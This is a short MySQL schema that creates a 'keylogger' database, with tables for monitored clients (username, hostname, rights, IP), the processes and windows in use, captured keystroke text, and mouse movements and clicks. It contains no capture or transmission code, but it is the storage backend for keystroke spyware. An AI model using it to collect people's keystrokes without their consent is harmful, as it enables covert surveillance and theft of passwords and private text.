CREATE DATABASE IF NOT EXISTS keylogger;
USE keylogger;

CREATE TABLE IF NOT EXISTS client (
       id int(5) NOT NULL AUTO_INCREMENT,
       client_guid varchar(35) DEFAULT NULL,
       u_name varchar(30) DEFAULT NULL,
       h_name varchar(30) DEFAULT NULL,
       u_rights varchar(30) DEFAULT NULL,
       ip_address varchar(15) DEFAULT NULL,
       PRIMARY KEY(id));

-- CREATE TABLE IF NOT EXISTS packet_logs (
--        id int(5) NOT NULL PRIMARY KEY AUTO_INCREMENT,
--        fk_client_id int(5) DEFAULT NULL,
--        size_total int(5) DEFAULT NULL,
--        size_data int(5) DEFAULT NULL,
--        nb_packet int(5) DEFAULT NULL,
--        num_packet int(5) DEFAULT NULL,
--        time timestamp DEFAULT 0,
--        FOREIGN KEY(fk_client_id) REFERENCES client(id));

CREATE TABLE IF NOT EXISTS process_logs (
       id int(5) NOT NULL PRIMARY KEY AUTO_INCREMENT,
       fk_client_id int(5) DEFAULT NULL,
       -- fk_packet_id int(5) DEFAULT NULL,
       path varchar(255) DEFAULT NULL,
       wName varchar(255) DEFAULT NULL,
       FOREIGN KEY(fk_client_id) REFERENCES client(id));
       -- FOREIGN KEY(fk_packet_id) REFERENCES packet_logs(id));

CREATE TABLE IF NOT EXISTS kb_logs (
       id int(5) NOT NULL PRIMARY KEY AUTO_INCREMENT,
       fk_client_id int(5) NOT NULL,
       fk_process_id int(5) NOT NULL,
       kb_start timestamp DEFAULT 0,
       kb_end timestamp DEFAULT 0,
       kb_entry text DEFAULT NULL,
       FOREIGN KEY(fk_client_id) REFERENCES client(id),
       FOREIGN KEY(fk_process_id) REFERENCES process_logs(id));

CREATE TABLE IF NOT EXISTS mouse_move_logs (
       id int(5) NOT NULL PRIMARY KEY AUTO_INCREMENT,
       fk_client_id int(5) NOT NULL,
       fk_process_id int(5) NOT NULL,
       time timestamp DEFAULT 0,
       start_x int(5) DEFAULT NULL,
       start_y int(5) DEFAULT NULL,
       end_x int(5) DEFAULT NULL,
       end_y int(5) DEFAULT NULL,
       FOREIGN KEY(fk_client_id) REFERENCES client(id),
       FOREIGN KEY(fk_process_id) REFERENCES process_logs(id));

CREATE TABLE IF NOT EXISTS mouse_click_logs (
       id int(5) NOT NULL PRIMARY KEY AUTO_INCREMENT,
       fk_client_id int(5) NOT NULL,
       fk_process_id int(5) NOT NULL,
       time timestamp DEFAULT 0,
       click_x int(5) DEFAULT NULL,
       click_y int(5) DEFAULT NULL,
       click_type varchar(10) DEFAULT NULL,
       FOREIGN KEY(fk_client_id) REFERENCES client(id),
       FOREIGN KEY(fk_process_id) REFERENCES process_logs(id));
